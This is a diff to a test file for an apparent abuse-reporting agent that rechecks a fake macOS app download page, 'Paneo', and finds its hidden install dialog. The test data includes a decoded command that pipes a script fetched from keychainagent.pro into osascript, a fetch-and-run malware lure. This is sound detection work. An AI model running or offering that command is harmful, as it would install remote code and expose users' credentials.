@@ -7,7 +7,7 @@ import type { sendAbuseEmailRoute } from "../mail";
 import { ProviderSubmissionRejectedError, type DecisionAnswer, type ProviderSubmissionProvider } from "../providers/submission_contracts";
 import { AbuseRepository } from "../repository";
 import { UnknownExternalStateError } from "../worker/shared";
-import type { WebsiteArchiveResult } from "../../website_archive";
+import { capturedDocumentContent, type WebsiteArchiveResult } from "../../website_archive";
 import type { DecisionAgentModel } from "./agent";
 import { followUpProviderDecision } from "./decision";
 
@@ -27,7 +27,12 @@ const PAGE = `<html><body><h1>Window Manager for Power Users</h1><a href="#downl
 <div class="install-modal" role="dialog" hidden><h2>Install Paneo</h2><p>1 Open Terminal</p><code>${COMMAND}</code></div></body></html>`;
 const PNG = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#ffffff" } }).png().toBuffer();
 
+/**
+ * A capture as the archive makes it: the snapshot holds the whole DOM, the
+ * archive's HTML and text only what a visitor sees, so not the closed dialog.
+ */
 function liveCapture(url: string): WebsiteArchiveResult {
+	const visible = capturedDocumentContent(PAGE);
 	return {
 		requestedUrl: url,
 		url,
@@ -37,9 +42,9 @@ function liveCapture(url: string): WebsiteArchiveResult {
 		route: "residential exit",
 		userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
 		screenshotPng: PNG,
-		mhtml: Buffer.from(PAGE),
-		html: Buffer.from(PAGE),
-		text: Buffer.from("Window Manager for Power Users\nDownload for macOS"),
+		mhtml: Buffer.from(`From: <Saved by Blink>\r\nSnapshot-Content-Location: ${url}\r\nContent-Type: text/html\r\n\r\n${PAGE}`),
+		html: Buffer.from(visible.html),
+		text: Buffer.from(visible.text),
 	};
 }
 
@@ -104,6 +109,10 @@ describe("provider decision follow-up agent", () => {
 		// The recheck's result reached the model: the hidden dialog's command, decoded, and its screenshot.
 		const recheck = JSON.parse((inputs[1]!.find((item) => (item as { type?: string }).type === "function_call_output") as { output: string }).output);
 		expect(recheck).toMatchObject({ reached: true, route: "residential exit", screenshot: "recheck-1.png" });
+		// Production 2026-11-16: macmorrow.app's command sits in a dialog that is `hidden` until a
+		// click; the visible text lacks it, so the agent wrongly concluded the command was gone.
+		expect(recheck.visiblePageText).not.toContain("base64");
+		expect(recheck.fullDocumentText).toContain("1 Open Terminal");
 		expect(recheck.pasteCommands[0].decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 | osascript -l JavaScript"]);
 		// Each turn carries the previous turns, reasoning included.
 		expect(inputs[1]).toContainEqual({ type: "reasoning", id: "r1", encrypted_content: "x" });
